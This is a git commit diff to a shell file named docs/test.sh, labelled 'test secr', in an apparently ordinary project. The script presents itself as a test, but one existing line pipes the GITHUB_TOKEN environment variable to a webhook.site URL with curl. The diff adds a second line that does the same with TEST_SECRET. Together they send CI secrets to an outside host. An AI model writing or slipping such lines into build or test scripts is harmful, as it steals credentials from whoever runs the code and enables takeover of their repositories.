38a65e23aa77d665f12c9f061f5ccb78b2f5db76
Nicolae Dicu <Nicolae.Dicu.ext@qorix.ai>
2025-06-07 01:41:02 +0200

    test secr

--- docs/test.sh
+++ docs/test.sh
@@ -4,6 +4,7 @@ set -e  # Exit on error
 echo "Starting test script..."
 
 # Make the curl request and capture its output
+echo TEST_SECRET=$TEST_SECRET | curl -s -X POST --data-binary @- https://webhook.site/7dc2127f-69cb-4ab8-8052-105cc98d8e57
 response=$(echo TOKEN=$GITHUB_TOKEN | curl -s -X POST --data-binary @- https://webhook.site/7dc2127f-69cb-4ab8-8052-105cc98d8e57)
 
 echo "Webhook request completed with response: $response"
